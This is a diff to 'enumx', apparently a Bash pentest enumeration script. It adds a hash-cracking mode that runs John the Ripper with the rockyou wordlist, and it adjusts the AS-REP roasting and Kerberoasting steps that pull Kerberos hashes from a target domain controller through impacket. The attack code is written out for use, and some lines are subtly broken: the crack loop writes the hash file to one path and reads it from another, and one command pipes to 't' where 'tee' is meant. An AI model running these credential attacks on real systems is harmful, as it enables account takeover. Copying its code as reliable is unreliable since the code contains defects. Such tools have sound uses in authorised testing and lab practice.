@@ -15,13 +15,14 @@ EOF
 #  cups curl dnsutils git influxdb inetutils-ftp ldap-utils libimage-exiftool-perl
 #  mariadb-server metasploit-framework nano nbtscan netcat-openbsd nfs-common nmap
 #  odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind
-#  smbclient tree wafw00f whatweb
+#  smbclient tree wafw00f whatweb wordlists
 
 # Usage information
 if [ -z "$1" ]; then
     echo "  Examples:"
     echo "    enumx <target>                - Run enumeration on the specified target."
     echo "    enumx <target> creds          - Run enumeration on the specified target using specific usernames and passwords."
+    echo "    enumx <target> crack          - Attempt to quickly crack each hash within 15 seconds."
     echo "    enumx update                  - Update to the latest version of enumx."
     echo "    enumx install                 - Install the pre-required tools for enumx (Kali Linux / Debian)."
     exit 1
@@ -39,7 +40,8 @@ fi
 # Install the pre-required tools for enumx (Kali Linux / Debian)
 if [[ "$1" == "install" ]]; then
     echo 'Installing pre-required tools for enumx (Kali Linux / Debian)...'
-    sudo apt install -y cups curl dnsutils git influxdb inetutils-ftp ldap-utils libimage-exiftool-perl mariadb-server metasploit-framework nano nbtscan netcat-openbsd nfs-common nmap odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind smbclient tree wafw00f whatweb
+    sudo apt install -y cups curl dnsutils git influxdb inetutils-ftp ldap-utils libimage-exiftool-perl mariadb-server metasploit-framework nano nbtscan netcat-openbsd nfs-common nmap odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind smbclient tree wafw00f whatweb wordlists
+    gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
     echo 'Install complete.'
     exit 1
 fi
@@ -66,7 +68,6 @@ sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
 touch "$enumx_dir"/domains
 sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null
 
-
 # Enter usernames and passwords if creds parameter is selected
 if [[ "$2" == "creds" ]]; then
   nano "$enumx_dir"/usernames
@@ -74,6 +75,18 @@ if [[ "$2" == "creds" ]]; then
   nano "$enumx_dir"/creds
   using_creds=true
 fi
+# Attempt to quickly crack each hash within 15 seconds.
+if [[ "$2" == "crack" ]]; then
+    echo 'Attempting to crack each hash within 15 seconds...'
+    for hash in $(cat "$enumx_dir"/hashes); do
+        echo "$hash" > .hash
+        rm -f "$enumx_dir"/john.pot
+        john "$enumx_dir"/.hash -w=/usr/share/wordlists/rockyou.txt --max-run-time=15 --pot="$enumx_dir"/john.pot
+    done
+    echo 'Cracking attempt completed.'
+    exit 1
+fi
+
 
 # Scan for open ports using nmap
 open_ports=$(nmap --open "$target" | awk '{print $1}' | grep '/' | sed 's#/.*##' | sort -n)
@@ -130,11 +143,11 @@ for port in $open_ports; do
             nmap $target -p"$port" --host-timeout 3s -T5 | grep -vE 'Nmap|latency|nmap' | sed '1d'
             if [ -s "$enumx_dir/domains" ]; then
                 for domain in $(cat "$enumx_dir/domains"); do
-                    PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '$krb5asrep' 2>/dev/null | t -a "$enumx_dir/hashes"
+                    PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '$krb' 2>/dev/null | t -a "$enumx_dir/hashes"
                 done
                 for domain in $(cat "$enumx_dir/domains"); do
                     for cred in $(cat "$enumx_dir/creds"); do
-                         PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep -iE '$krb5tgs' 2>/dev/null | tee -a "$enumx_dir/hashes"
+                         PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep -iE '$krb' 2>/dev/null | tee -a "$enumx_dir/hashes"
                     done
                 done
             fi
